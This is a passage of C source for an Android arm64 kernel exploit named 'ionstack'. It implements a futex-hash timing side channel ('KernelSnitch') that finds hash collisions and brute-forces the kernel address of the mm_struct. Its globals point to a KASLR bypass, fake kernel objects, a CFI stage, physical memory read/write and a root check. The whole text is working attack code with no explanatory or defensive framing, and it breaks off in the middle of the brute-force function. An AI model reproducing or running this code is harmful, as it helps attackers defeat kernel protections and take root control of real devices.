
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

extern char **environ;




#include "tables.c"

static void pin_to_core_0(char *core); 




static const char *ionstack_stage;
static char ashmem_path[256] = "/dev/ashmem";
static unsigned long long kaslr_base;
static unsigned long long kaslr_slide;
static int kaslr_done;
static unsigned long long g_ionstack_dev;      
static unsigned long long futex_hashsize = -1; 
static unsigned long long *ks;                 


static unsigned long long page_base, fake_lock, fake_w0, fake_task,
    fake_fops, binwrite_target;
static int cfi_stage_done, cfi_last_step, cfi_last_errno, cfi_attempts;
static int root_child_done, physrw_read_ok, physrw_write_ok;
static unsigned int root_uid_before, root_uid_after;

#define SYS_FUTEX 98
#define SYS_CLONE 220
#define SYS_PERF_EVENT_OPEN 241

#define FUTEX_WAIT_PRIVATE 128
#define FUTEX_WAKE_PRIVATE 129




static inline uint32_t ror32(uint32_t v, int n) { return (v >> n) | (v << (32 - n)); }

static inline uint64_t cntvct_read(void) {
    uint64_t v;
    __asm__ __volatile__("isb" ::: "memory");
    __asm__ __volatile__("mrs %0, cntvct_el0" : "=r"(v));
    __asm__ __volatile__("isb" ::: "memory");
    return v;
}

static long futex_op(unsigned long addr, unsigned int op, unsigned int val,
                     unsigned long t, unsigned long a, unsigned int b) {
    return syscall(SYS_FUTEX, addr, op, val, t, a, b);
}

static int is_kernel_ptr(unsigned long long x) { return x > 0xFFFF7FFFFFFFFFFFull; }
static int is_direct_ptr(unsigned long long x) { return (x >> 38) == 0x3FFFFFEull; }

static unsigned long long data_addr(unsigned long long x) {
    return (x + 0x401FFF0000ull) | 0xFFFFFF8000000000ull;
}
static unsigned long long text_addr(unsigned long long x) {
    if (kaslr_done) x += 0x3FF8000000ull + kaslr_base;
    return x;
}
static unsigned long long p0_data_alias(unsigned long long x) {
    return (x + 0x401FFF0000ull) | 0xFFFFFF8000000000ull;
}

static int ionstack_stage_is(const char *s2) {
    return ionstack_stage && strcmp(ionstack_stage, s2) == 0;
}

static long long read_first_line(const char *path, char *s, size_t maxlen) {
    if (!maxlen) return 0;
    snprintf(s, maxlen, "unreadable");
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t n = read(fd, s, maxlen - 1);
    int saved = errno;
    close(fd);
    if (n <= 0) { errno = saved; return snprintf(s, maxlen, "unreadable"); }
    s[n] = 0;
    s[strcspn(s, "\r\n")] = 0;
    return 0;
}

static void pin_to_core(unsigned long long core) {
    cpu_set_t cpuset, cur;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset)) {
        if (sched_getaffinity(0, sizeof(cur), &cur)) {
            printf("\x1B[31m[-] \x1B[0mpin_to_core(%zu) failed: %m (continuing unpinned)\n", core);
            return;
        }
        for (unsigned long long i = 0; i < 1024; i++) {
            if (CPU_ISSET(i, &cur)) {
                CPU_ZERO(&cpuset);
                CPU_SET(i, &cpuset);
                if (!sched_setaffinity(0, sizeof(cpuset), &cpuset)) {
                    printf("\x1B[31m[-] \x1B[0mpin_to_core(%zu) refused; pinned to %d instead\n", core, (int)i);
                    return;
                }
            }
        }
        printf("\x1B[31m[-] \x1B[0mpin_to_core(%zu) failed: %m (continuing unpinned)\n", core);
    }
}




static unsigned int futex_hash(unsigned long long a1, unsigned long long a2) {
    if (futex_hashsize == (unsigned long long)-1) {
        printf("\x1B[31m[-] \x1B[0m[detected] assert(%s): need to call futex_init() first\n",
               "(futex_hashsize != (unsigned long)-1)");
    }
    uint32_t v5 = (uint32_t)(a1 & 0xFFF) - 559038721u;
    uint32_t w10 = (uint32_t)(a1 & 0xFFFFF000u);
    uint32_t w12 = (uint32_t)a2 - w10;
    uint32_t v6 = v5 + w10;
    uint32_t v7 = v5 + (uint32_t)(a2 >> 32);
    uint32_t v8 = w12 ^ ror32(v6, 28);
    uint32_t v9 = v7 - v8;
    uint32_t v10 = v6 + v7;
    uint32_t v11 = v9 ^ ror32(v8, 26);
    uint32_t v12 = v10 - v11;
    uint32_t v13 = v8 + v10;
    uint32_t v14 = v12 ^ ror32(v11, 24);
    uint32_t v15 = v13 - v14;
    uint32_t v16 = v11 + v13;
    uint32_t v17 = v15 ^ ror32(v14, 16);
    uint32_t v18 = v16 - v17;
    uint32_t v19 = v14 + v16;
    uint32_t v20 = v18 ^ ror32(v17, 13);
    uint32_t v21 = v17 + v19;
    uint32_t v22 = v20 + v21;
    uint32_t x = (v19 - v20) ^ ror32(v20, 28) ^ v22;
    uint32_t r = x - (v22 >> 18);
    uint32_t r2 = (r ^ (v21 + (uint32_t)(a1 >> 32))) - (r >> 21);
    uint32_t r3 = (r2 ^ v22) - (r2 >> 7);
    uint32_t r4 = (r3 ^ r) - (r3 >> 16);
    uint32_t r5 = (r4 ^ r2) - (r4 >> 28);
    uint32_t r6 = (r5 ^ r3) - (r5 >> 18);
    return (uint32_t)(futex_hashsize - 1) & ((r6 ^ r4) - (r6 >> 8));
}

static void futex_init(void) {
    char *e = getenv("IONSTACK_KS_HASH_SIZE");
    if (e && *e) {
        char *end = NULL;
        errno = 0;
        unsigned long v = strtoul(e, &end, 0);
        if (!errno && end && !*end && v) { futex_hashsize = v; return; }
        printf("\x1B[31m[-] \x1B[0minvalid IONSTACK_KS_HASH_SIZE=%s; using default\n", e);
    }
    futex_hashsize = (unsigned long long)sysconf(_SC_NPROCESSORS_ONLN) << 8;
}




#define KS_MM_SIZE       0x00
#define KS_STRIDE        0x08
#define KS_OBJ_OFF       0x10
#define KS_ORDER         0x18
#define KS_VERBOSE       0x20
#define KS_COLLISIONS    0x28
#define KS_THREADS       0x30
#define KS_CPU           0x38
#define KS_SAMPLE_HASH   0x40
#define KS_TOTAL_FUTEXES 0x48
#define KS_FUTEXES       0x50
#define KS_TIMES         0x1060  
#define KS_COLL_ARR      0x1058  
#define KS_MM_FOUND      0x1068
#define KS_MM            0x1070
#define KS_APPROX        0x1078
#define KS_THRESHOLD     0x1080
#define KS_MULT          0x1088
#define KS_APPENDED      0x1090
#define KS_SCANNED       0x1098
#define KS_DETECTED      0x10A0
#define KS_MAX           0x10A8
#define KS_MAX_ADDR      0x10B0
#define KS_MIN_SELECTED  0x10B8
#define KS_CORR_TOP      0x10C0
#define KS_CORR_COUNT    0x10C8
#define KS_CORR_MATCH    0x10D0
#define KS_CORR_ADDRS    0x10D8
#define KS_CORR_TIMES    0x12D8
#define KS_CAND_COUNT    0x14D8
#define KS_CAND_LIST     0x14E0
#define KS_INC_COUNT     0x1D28
#define KS_TIDS          0x1D30
#define KS_SPAN          0x1D38
#define KS_ID_START      0x1D40
#define KS_ID_END        0x1D48
#define KS_STATE         0x1D50  
#define KS_MTE           0x1D54  

#define KERNELSNITCH_INIT 1
#define KERNELSNITCH_COLLISIONS_FOUND 2
#define KERNELSNITCH_COLLISIONS_NOT_FOUND 3
#define KERNELSNITCH_MM_FOUND 4
#define KERNELSNITCH_MM_NOT_FOUND 5

static int cmp_u32(const void *a, const void *b) {
    return (unsigned)(*(const unsigned *)a - *(const unsigned *)b);
}


static unsigned long long __measure(unsigned long long addr) {
    unsigned long long samples[128];
    for (int i = 0; i < 128; i++) {
        sched_yield();
        unsigned long long t0 = cntvct_read();
        if ((unsigned int)syscall(SYS_FUTEX, addr, FUTEX_WAKE_PRIVATE, 0, 0, 0, 0) == (unsigned)-1) {
            printf("\x1B[31m[!] \x1B[0mSYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0)): %m\n");
            exit(-1);
        }
        unsigned long long t1 = cntvct_read();
        samples[i] = t1 - t0;
    }
    qsort(samples, 128, 8, cmp_u32);
    unsigned long long sum = 0;
    for (int i = 0; i < 8; i++) sum += samples[i];
    return sum >> 3;
}

struct inc_arg { unsigned long long ks; unsigned long long slot; };

static void *__do_increase(void *p) {
    struct inc_arg *a = p;
    unsigned long long base = a->ks;
    __atomic_fetch_add((unsigned long long *)(base + KS_INC_COUNT), 1, __ATOMIC_RELEASE);
    if ((unsigned int)syscall(SYS_FUTEX, base + a->slot + 88, FUTEX_WAIT_PRIVATE, 0, 0, 0, 0) == (unsigned)-1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0)): %m\n");
        exit(-1);
    }
    free(a);
    return NULL;
}

static long __increase(unsigned long long a1, unsigned long long count) {
    __atomic_store_n((unsigned long long *)(a1 + KS_INC_COUNT), 0, __ATOMIC_RELEASE);
    if (count) {
        for (unsigned long long i = 0; i < count; i++) {
            struct inc_arg *arg = calloc(1, sizeof(*arg));
            arg->ks = a1;
            arg->slot = 128;
            pthread_t tid;
            if (pthread_create(&tid, NULL, __do_increase, arg) == -1) {
                printf("\x1B[31m[!] \x1B[0mSYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg)): %m\n");
                exit(-1);
            }
        }
    }
    unsigned long long v;
    while ((v = __atomic_load_n((unsigned long long *)(a1 + KS_INC_COUNT), __ATOMIC_ACQUIRE)) < count)
        sched_yield();
    return usleep(100000);
}

static unsigned long long *kernelsnitch_setup(unsigned long long mm_size,
                                              unsigned long long order,
                                              unsigned long long threads,
                                              unsigned long long collisions,
                                              unsigned long long verbose,
                                              int mte) {
    unsigned long long *s = mmap(NULL, 0x1D58, PROT_READ | PROT_WRITE,
                                 MAP_ANON | MAP_SHARED, -1, 0);
    if (s == (unsigned long long *)-1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0)): %m\n");
        exit(-1);
    }
    s[526] = -1; 
    s[0] = mm_size;

    char *e = getenv("IONSTACK_KS_STRIDE");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) mm_size = v;
    }
    s[1] = mm_size; 

    e = getenv("IONSTACK_KS_OBJ_OFFSET");
    unsigned long long obj_off = 0;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) obj_off = v;
    }
    s[2] = obj_off;

    e = getenv("IONSTACK_KS_CORRELATE_TOP");
    unsigned long long corr_top = 64;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) corr_top = v;
    }
    s[536] = corr_top;
    if (s[536] >= 0x41) s[536] = 64;

    s[3] = order;
    s[6] = threads;
    s[7] = sysconf(_SC_NPROCESSORS_ONLN);
    s[5] = collisions;
    s[4] = verbose;
    *(int *)((char *)s + KS_MTE) = mte;

    
    unsigned long long v = 1;
    while (v < (unsigned long long)sysconf(_SC_NPROCESSORS_ONLN) << 8) v *= 2;
    s[8] = v;
    s[9] = 4 * v * collisions;

    unsigned long long *times = mmap(NULL, 32 * v * collisions, PROT_READ | PROT_WRITE,
                                     MAP_ANON | MAP_SHARED, -1, 0);
    if (times == (unsigned long long *)-1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0)): %m\n");
        exit(-1);
    }
    s[524] = (unsigned long long)times;

    pthread_t *tids = mmap(NULL, 8 * s[6], PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0);
    if (tids == (pthread_t *)-1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0)): %m\n");
        exit(-1);
    }
    s[934] = (unsigned long long)tids;

    
    void *futexes = mmap(NULL, 0x1000000000ull, PROT_NONE,
                         MAP_ANON | MAP_PRIVATE | MAP_NORESERVE, -1, 0);
    if (futexes == (void *)-1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(mmap(0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0)): %m\n");
        exit(-1);
    }
    long long step = -1073741824;
    unsigned long long off = 0;
    do {
        if (mmap((void *)(off + (unsigned long long)futexes), 0x40000000ull,
                 PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED | MAP_FIXED, -1, 0) == (void *)-1) {
            printf("\x1B[31m[!] \x1B[0mSYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0)): %m\n");
            exit(-1);
        }
        step += 0x40000000LL;
        off += 0x40000000ull;
    } while (step >> 30 < 0x3F);
    s[10] = (unsigned long long)futexes;

    e = getenv("IONSTACK_KS_ID_START");
    unsigned long long id_start = 0xFFFFFF8000000000ull;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) id_start = v;
    }
    s[936] = id_start;

    e = getenv("IONSTACK_KS_ID_END");
    unsigned long long id_end = 0xFFFFFFC000000000ull;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) id_end = v;
    }
    if (id_end <= id_start) id_end = 0xFFFFFFC000000000ull;
    s[937] = id_end;
    s[935] = (id_end - id_start) / s[6];

    unsigned long long *coll = mmap(NULL, 8 * s[5] + 8, PROT_READ | PROT_WRITE,
                                    MAP_ANON | MAP_SHARED, -1, 0);
    if (coll == (unsigned long long *)-1) {
        printf("\x1B[31m[!] \x1B[0mSYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0)): %m\n");
        exit(-1);
    }
    s[523] = (unsigned long long)coll;

    if (s[4]) {
        printf("\x1B[33m[*] \x1B[0mparameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
               s[7], s[0], s[3], s[6], s[5], *(int *)((char *)s + KS_MTE) ? "enabled" : "disabled");
    }

    e = getenv("IONSTACK_KS_CORE");
    char *core = NULL;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) core = (char *)v;
    }
    pin_to_core_0(core);
    futex_init();
    *(int *)((char *)s + KS_STATE) = KERNELSNITCH_INIT;
    return s;
}


static void pin_to_core_0(char *core) {
    unsigned long long c = core ? (unsigned long long)core : 0;
    cpu_set_t cpuset, cur;
    CPU_ZERO(&cpuset);
    CPU_SET(c, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset)) {
        if (sched_getaffinity(0, sizeof(cur), &cur)) {
            printf("\x1B[31m[-] \x1B[0mpin_to_core(%zu) failed: %m (continuing unpinned)\n", c);
            return;
        }
        for (unsigned long long i = 0; i < 1024; i++) {
            if (CPU_ISSET(i, &cur)) {
                CPU_ZERO(&cpuset);
                CPU_SET(i, &cpuset);
                if (!sched_setaffinity(0, sizeof(cpuset), &cpuset)) {
                    printf("\x1B[31m[-] \x1B[0mpin_to_core(%zu) refused; pinned to %d instead\n", c, (int)i);
                    return;
                }
            }
        }
        printf("\x1B[31m[-] \x1B[0mpin_to_core(%zu) failed: %m (continuing unpinned)\n", c);
    }
}


static unsigned long long *KS_P(unsigned long long off) { return (unsigned long long *)((char *)ks + off); }

static void kernelsnitch_find_collisions(unsigned long long a1) {
    
    char *e = getenv("IONSTACK_KS_SCAN_ALL");
    int scan_all = 0;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) scan_all = v != 0;
    }
    
    e = getenv("IONSTACK_KS_RANK_TOP");
    unsigned long long rank_top = 0;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) rank_top = v;
    }
    unsigned long long scan_limit = *KS_P(KS_TOTAL_FUTEXES);
    e = getenv("IONSTACK_KS_SCAN_LIMIT");
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) scan_limit = v;
    }
    if (*(unsigned int *)((char *)ks + KS_STATE) != KERNELSNITCH_INIT)
        printf("\x1B[31m[-] \x1B[0m[detected] assert(%s): wrong state\n", "(ks->state == KERNELSNITCH_INIT)");
    unsigned long long wanted = *KS_P(KS_COLLISIONS);
    if (wanted <= 1) {
        printf("\x1B[31m[-] \x1B[0m[detected] assert(%s): need at least one collision\n", "(ks->collisions >= 2)");
        wanted = *KS_P(KS_COLLISIONS);
    }
    unsigned long long v19 = scan_limit < *KS_P(KS_TOTAL_FUTEXES) ? scan_limit : *KS_P(KS_TOTAL_FUTEXES);

    unsigned long long m1 = __measure(*KS_P(KS_FUTEXES));
    unsigned long long m2 = __measure(*KS_P(KS_FUTEXES) + 4104);
    unsigned long long off = (m1 < m2) ? 0 : 4104;
    unsigned long long approx = __measure(*KS_P(KS_FUTEXES) + off);

    e = getenv("IONSTACK_KS_THRESHOLD_MULT");
    unsigned long long mult = 10;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) mult = v;
    }
    e = getenv("IONSTACK_KS_APPENDED_FUTEXES");
    unsigned long long appended = 4096;
    if (e && *e) {
        char *end = NULL; errno = 0;
        unsigned long long v = strtoull(e, &end, 0);
        if (!errno && end && !*end) appended = v;
    }
    *KS_P(KS_MULT) = mult;
    *KS_P(KS_APPENDED) = appended;
    *KS_P(KS_APPROX) = approx;
    *KS_P(KS_THRESHOLD) = mult * approx;
    *KS_P(KS_SCANNED) = 0;
    *KS_P(KS_DETECTED) = 0;
    *KS_P(KS_MAX) = 0;
    *KS_P(KS_MAX_ADDR) = 0;
    *KS_P(KS_MIN_SELECTED) = 0;
    *KS_P(KS_CORR_COUNT) = 0;
    *KS_P(KS_CORR_MATCH) = 0;
    memset((char *)ks + KS_CORR_ADDRS, 0, 512);   
    memset((char *)ks + KS_CORR_TIMES, 0, 512);

    __increase(a1, appended);

    if (*KS_P(KS_VERBOSE))
        printf("\x1B[33m[*] \x1B[0mstart finding collisisons approx=%zu threshold=%zu mult=%zu appended=%zu scan_limit=%zu rank_top=%zu\n",
               *KS_P(KS_APPROX), *KS_P(KS_THRESHOLD), *KS_P(KS_MULT), *KS_P(KS_APPENDED), v19, rank_top);

    unsigned long long *coll = (unsigned long long *)*KS_P(KS_COLL_ARR);
    coll[0] = a1 + 216;
    if (*KS_P(KS_VERBOSE))
        printf("\x1B[33m[*] \x1B[0mtarget    %016zx\n", coll[0]);

    unsigned long long detected = 0, found = 0;
    unsigned long long base = *KS_P(KS_FUTEXES);
    unsigned long long *times = (unsigned long long *)*KS_P(KS_TIMES);
    unsigned long long corr_top = *KS_P(KS_CORR_TOP);

    if (v19 >= 3) {
        unsigned long long i = 2;
        while (1) {
            if (!(scan_all & 1) && !*KS_P(KS_CORR_COUNT) && found >= wanted - 1)
                goto done_scan;
            if (i == 0x1000000) goto done_scan;
            unsigned long long addr = base + (i << 12) + ((8 * i) & 0xFF8);
            unsigned long long t = __measure(addr);
            times[i] = t;
            
            if (t && corr_top) {
                unsigned long long cap = corr_top < 64 ? corr_top : 64;
                unsigned long long count = *KS_P(KS_CORR_COUNT);
                unsigned long long pos = 0;
                int ins = corr_top != 0;
                if (count) {
                    while (pos < cap && pos < count) {
                        if (*(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * pos) < t)
                            break;
                        pos++;
                    }
                    ins = pos < cap;
                }
                if (ins && (count || 1)) {
                    unsigned long long newcount = count < cap ? count + 1 : cap;
                    unsigned long long last = newcount - 1;
                    if (last > pos) {
                        for (unsigned long long j = last; j > pos; j--) {
                            *(unsigned long long *)((char *)ks + KS_CORR_ADDRS + 8 * j) =
                                *(unsigned long long *)((char *)ks + KS_CORR_ADDRS + 8 * (j - 1));
                            *(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * j) =
                                *(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * (j - 1));
                        }
                    }
                    *(unsigned long long *)((char *)ks + KS_CORR_ADDRS + 8 * pos) = addr;
                    *(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * pos) = t;
                    *KS_P(KS_CORR_COUNT) = newcount;
                }
            }
            (*KS_P(KS_SCANNED))++;
            if (times[i] > *KS_P(KS_MAX)) { *KS_P(KS_MAX) = times[i]; *KS_P(KS_MAX_ADDR) = addr; }
            if (times[i] > *KS_P(KS_THRESHOLD)) {
                detected++;
                if (!rank_top) {
                    found++;
                    coll[found] = addr;
                    *KS_P(KS_MIN_SELECTED) = times[i];
                    if (*KS_P(KS_VERBOSE))
                        printf("\x1B[33m[*] \x1B[0m  %016zx time=%zu\n", addr, times[i]);
                }
            }
            if (++i == v19) goto done_scan;
        }
    }
    detected = 0; found = 0;
done_scan:
    
    if (rank_top && wanted != 1) {
        unsigned long long picked = 0;
        unsigned long long rank = 1;
        while (1) {
            if (v19 < 3) goto done_corr;
            unsigned long long *ts = (unsigned long long *)*KS_P(KS_TIMES);
            unsigned long long best_t = 0, best_idx = 0, best_addr = 0;
            unsigned long long i = 2;
            while (i < v19) {
                if (!ts[i]) { i++; continue; }
                if ((i >> 24) != 0) break;
                if (rank >= 2) {
                    
                    int skip = 0;
                    for (unsigned long long k = 1; k <= picked; k++)
                        if (coll[k] == base + (i << 12) + ((8 * i) & 0xFF8)) { skip = 1; break; }
                    if (!skip && ts[i] > best_t) {
                        best_t = ts[i]; best_idx = i;
                        best_addr = base + (i << 12) + ((8 * i) & 0xFF8);
                    }
                } else if (ts[i] > best_t) {
                    best_t = ts[i]; best_idx = i;
                    best_addr = base + (i << 12) + ((8 * i) & 0xFF8);
                }
                i++;
            }
            if (!best_idx) break;
            if (best_t > *KS_P(KS_THRESHOLD)) {
                found++;
                coll[found] = best_addr;
                *KS_P(KS_MIN_SELECTED) = best_t;
                if (*KS_P(KS_VERBOSE))
                    printf("\x1B[33m[*] \x1B[0m  %016zx time=%zu rank=%zu\n", best_addr, best_t, rank);
                rank++;
                picked++;
                if (rank > wanted - 1) continue;
            }
            break;
        }
    }
done_corr:
    *KS_P(KS_DETECTED) = detected;
    if (*KS_P(KS_CORR_COUNT)) {
        if (wanted - 1) {
            found = 0;
            unsigned long long i = 1;
            while (i <= *KS_P(KS_CORR_COUNT) && i <= wanted - 1) {
                unsigned long long *c2 = (unsigned long long *)*KS_P(KS_COLL_ARR);
                c2[i] = *(unsigned long long *)((char *)ks + KS_CORR_ADDRS + 8 * (i - 1));
                *KS_P(KS_MIN_SELECTED) = *(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * (i - 1));
                if (*KS_P(KS_VERBOSE))
                    printf("\x1B[33m[*] \x1B[0m  %016zx time=%zu correlate-rank=%zu\n",
                           c2[i], *(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * (i - 1)), i);
                i++;
                found++;
            }
        }
    }
    if (wanted - 1 != found) {
        printf("\x1B[31m[-] \x1B[0monly found %zd collisions -> cannot continue (detected=%zu scanned=%zu max=%zu@%016zx threshold=%zu)\n",
               found, *KS_P(KS_DETECTED), *KS_P(KS_SCANNED), *KS_P(KS_MAX), *KS_P(KS_MAX_ADDR), *KS_P(KS_THRESHOLD));
        *(unsigned int *)((char *)ks + KS_STATE) = KERNELSNITCH_COLLISIONS_NOT_FOUND;
        return;
    }
    if (*KS_P(KS_VERBOSE))
        printf("\x1B[33m[*] \x1B[0mfound %zd collisisons detected=%zu scanned=%zu max=%zu@%016zx min_selected=%zu\n",
               wanted - 1, *KS_P(KS_DETECTED), *KS_P(KS_SCANNED), *KS_P(KS_MAX), *KS_P(KS_MAX_ADDR), *KS_P(KS_MIN_SELECTED));
    *(unsigned int *)((char *)ks + KS_STATE) = KERNELSNITCH_COLLISIONS_FOUND;
}


struct mm_leak_arg {
    unsigned long long ks;
    unsigned long long idx;
    unsigned long long start, end;
    unsigned long long best_addr, best_count, best_sum;
    unsigned long long src[65];
    unsigned long long count;
    unsigned long long cand_addrs[32];
    unsigned long long cand_counts[32];
    unsigned long long cand_sums[32];
};

static void *__mm_leak(void *p) {
    struct mm_leak_arg *a = p;
    unsigned long long s = (unsigned long long)a->ks;
    if (*KS_P(KS_VERBOSE))
        printf("\x1B[33m[*] \x1B[0m[% 3zd] start finding mm_struct [%016zx-%016zx]\n", a->idx, a->start, a->end);
    unsigned long long stride = *KS_P(KS_STRIDE) ? *KS_P(KS_STRIDE) : 8;
    unsigned long long obj_off = *KS_P(KS_OBJ_OFF);
    int correlate = *KS_P(KS_CORR_TOP) != 0;
    int mte = *(unsigned int *)((char *)ks + KS_MTE) != 0;

    unsigned long long v5 = a->start;
    if (v5 >= a->end) return NULL;
    unsigned long long window = 4096ull << *KS_P(KS_ORDER);
    unsigned long long v35;
    while (1) {
        if (!correlate && *KS_P(KS_MM_FOUND)) return NULL;
        if ((v5 & 0xFFFFFFFFFFull) != 0) {
            v35 = v5 + 0x40000000;
            if (v5 > 0xFFFFFFFFBFFFFFFFull) goto next_chunk;
        } else {
            if (*KS_P(KS_VERBOSE))
                printf("\x1B[33m[*] \x1B[0m[% 3zd] [%016zx-%016llx]\n", a->idx, v5, v5 + 0x10000000000ull);
            v35 = v5 | 0x40000000;
        }
        break;
    next_chunk:
        v5 = v35;
        if (v35 >= a->end) return NULL;
    }
    unsigned long long v6 = v5 + obj_off;
    v5 += window;
    unsigned long long *coll = (unsigned long long *)*KS_P(KS_COLL_ARR);
    unsigned long long ncand = *KS_P(KS_COLLISIONS);

    while (1) {
        if (v6 >= v5) {
            if (v5 < v35) { if (correlate || !*KS_P(KS_MM_FOUND)) { v6 = v5 + obj_off; v5 += window; continue; } }
            goto next_chunk2;
        }
        if (!correlate) {
            if (*KS_P(KS_MM_FOUND)) goto next_chunk2;
            if (mte) {
                unsigned long long v15 = 0;
                while (!*KS_P(KS_MM_FOUND)) {
                    unsigned long long cand = v6 & 0xF0FFFFFFFFFFFFFFull;
                    if (ncand < 2) goto found_mte;
                    unsigned long long i = 1;
                    int ok = 1;
                    do {
                        if (futex_hash(coll[0], cand + (v15 << 56)) !=
                            futex_hash(coll[i], cand + (v15 << 56))) { ok = 0; break; }
                        i++;
                    } while (i < ncand && ok);
                    if (ok) {
found_mte:
                        if (*KS_P(KS_VERBOSE))
                            printf("\x1B[33m[*] \x1B[0mfound mm_struct %016zx\n", cand + (v15 << 56));
                        *KS_P(KS_MM) = cand + (v15 << 56);
                        *KS_P(KS_MM_FOUND) = 1;
                        break;
                    }
                    if (++v15 == 15) break;
                }
                goto next_slot;
            } else {
                if (ncand < 2) goto found_plain;
                unsigned long long i = 1;
                int ok = 1;
                do {
                    if (futex_hash(coll[0], v6) != futex_hash(coll[i], v6)) { ok = 0; break; }
                    i++;
                } while (i < ncand && ok);
                if (ok) {
found_plain:
                    *KS_P(KS_MM) = v6;
                    *KS_P(KS_MM_FOUND) = 1;
                    goto next_chunk2;
                }
                goto next_slot;
            }
        }
        
        {
            unsigned long long matched = 0, sum = 0;
            unsigned long long src[65]; src[0] = 0;
            if (*KS_P(KS_CORR_COUNT) && *KS_P(KS_CORR_COUNT) <= 0x40) {
                unsigned long long h0 = futex_hash(coll[0], v6);
                unsigned long long n = *KS_P(KS_CORR_COUNT);
                for (unsigned long long i = 0; i < n && i < 64; i++) {
                    unsigned long long caddr = *(unsigned long long *)((char *)ks + KS_CORR_ADDRS + 8 * i);
                    if (caddr && (unsigned int)futex_hash(caddr, v6) == (unsigned int)h0) {
                        src[matched++] = caddr;
                        sum += *(unsigned long long *)((char *)ks + KS_CORR_TIMES + 8 * i);
                    }
                }
            }
            if (matched >= ncand - 1) {
                
                unsigned long long cnt = a->count, i2 = 0;
                while (i2 < cnt) {
                    if (a->cand_counts[i2] < matched ||
                        (a->cand_counts[i2] == matched && a->cand_sums[i2] < sum))
                        break;
                    i2++;
                }
                if (i2 <= 31) {
                    if (cnt < 32) cnt++;
                    for (unsigned long long j = cnt - 1; j > i2; j--) {
                        a->cand_addrs[j] = a->cand_addrs[j - 1];
                        a->cand_counts[j] = a->cand_counts[j - 1];
                        a->cand_sums[j] = a->cand_sums[j - 1];
                    }
                    a->cand_addrs[i2] = v6;
                    a->cand_counts[i2] = matched;
                    a->cand_sums[i2] = sum;
                    a->count = cnt;
                }
            }
            if (matched > a->best_count) {
                a->best_addr = v6; a->best_count = matched; a->best_sum = sum;
                memcpy(a->src, src, 8 * matched);
            } else if (matched == a->best_count && sum > a->best_sum) {
                a->best_addr = v6; a->best_count = matched; a->best_sum = sum;
                if (matched) memcpy(a->src, src, 8 * matched);
            }
        }
next_slot:
        v6 += stride;
        continue;
next_chunk2:
        if (v5 < v35) { if (correlate || !*KS_P(KS_MM_FOUND)) { v6 = v5 + obj_off; v5 += window; continue; } }
        goto next_chunk;
    }
    return NULL;
}

static void kernelsnitch_bruteforce(unsigned long long a1) {
    if (*(unsigned int *)((char *)ks + KS_STATE) != KERNELSNITCH_COLLISIONS_FOUND)
        printf("\x1B[31m[-] \x1B[0m[detected] assert(%s): wrong state\n", "(ks->state == KERNELSNITCH_COLLISIONS_FOUND)");
